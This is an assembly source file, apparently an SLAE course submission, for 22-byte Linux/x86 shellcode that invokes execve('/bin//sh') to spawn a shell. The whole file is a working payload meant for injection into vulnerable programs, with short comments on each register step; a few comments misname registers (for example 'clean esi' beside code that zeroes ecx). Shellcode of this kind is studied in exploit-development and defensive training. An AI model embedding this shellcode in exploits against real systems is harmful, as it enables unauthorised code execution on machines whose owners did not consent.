; Title: Linux/x86 execve "/bin/sh" - shellcode 22 byte
; Platform: linux/x86
; Date: 2015-01-03
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; SLAE-721

BITS 32

global _start
section .text

; syscalls kernel
SYS_EXECVE equ 0x0b

_start:

	; execve("/bin//sh", 0, 0);
	push SYS_EXECVE ; SYS_EXECVE = 11
	pop eax         ; set SYS_EXECVE to eax

	xor ecx, ecx    ; clean esi
	push ecx        ; esi is zero
	push 0x68732f2f ; push 'hs//'
	push 0x6e69622f ; push 'nib/'

	; execve("/bin//sh/", 0, 0);
	;             |
	;            ebx
	mov ebx, esp

	; execve("/bin//sh/", 0, 0);
	;                     ^  |
	;                     | edx
	;                    ecx
	mov edx, ecx    ; set zero to edx
	int 0x80        ; syscall execve
